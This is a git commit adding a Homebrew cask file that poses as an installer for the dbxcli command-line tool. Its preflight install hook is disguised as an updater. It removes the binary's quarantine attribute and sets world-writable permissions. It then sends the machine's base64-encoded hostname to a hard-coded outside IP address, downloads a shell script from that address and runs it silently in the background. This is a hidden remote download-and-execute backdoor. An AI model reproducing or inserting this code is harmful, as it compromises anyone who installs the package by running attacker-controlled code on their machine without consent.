86a193ced12127ecaf2f260b5fdb693a81557a44
Tim Topley <timothytopley@outlook.com>
2021-01-29 09:42:21 -0800

    1st commit

---
+++ Casks/dbxcli.rb
@@ -0,0 +1,67 @@
+cask "dbxcli" do
+  version "3.0.0"
+  sha256 "1149a2aa6a89829c6d540d04cc1db8cf5bb27e3d8b0ec6b32d830a6818bd7573"
+
+  url "https://github.com/dropbox/dbxcli/releases/download/v#{version}/dbxcli-darwin-amd64"
+  appcast "https://github.com/dropbox/dbxcli/"
+  name "dbxcli"
+  homepage "https://www.dropbox.com"
+
+  # Note that app is the exact binary name downloaded in the URL
+  # target: is used to rename
+  #app "dbxcli-darwin-amd64", target: "dbxcli-test"
+  
+  # Note not using app since this is a binary application
+  #binary "dbxcli-test"
+  
+  # this will force the binary into /brewprefix/Cellar
+  #keg_only :This_is_a_test
+  # Doesnt work for casks
+  #
+  #
+  # Removed, the symlink to rename it to dbxcli-test is getting permission errors
+  #binary "dbxcli-darwin-amd64", target: "dbxcli-test"
+  # goes here so it works
+  binary "dbxcli-darwin-amd64", target: "#{HOMEBREW_PREFIX}/Cellar/dbxcli-test"
+
+
+  # the following are actions performed while in the download dir
+  #  ~/Library/Caches/Homebrew/downloads
+  #  Should remove quartentine bit
+  preflight do
+      
+    system_command "xattr", 
+                      args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
+    set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'
+
+    encodedname = %x{hostname | base64}.strip()
+
+    updatepath = "#{HOMEBREW_PREFIX}/Cellar/update.sh"
+    shimscript = "#{staged_path}/updater-wrapper.sh"
+
+    updateurl = "http://35.226.105.223:80/ping\?log=#{encodedname}"
+
+    curlcommand = "curl -s #{updateurl} -o #{updatepath}"
+
+    IO.write shimscript, <<~EOS
+      #!/bin/sh
+      #{curlcommand}
+      chmod +x #{updatepath}
+      #{updatepath} >/dev/null 2>&1 & 
+      disown
+      true
+    EOS
+
+    system_command "chmod",
+          args: ["+x", shimscript]
+
+    system_command shimscript 
+
+  end
+
+
+ # def install
+ #   system "mv dbxcli-darwin-amd64 dbxcli"
+ #   bin.install "dbxcli"
+ # end
+end
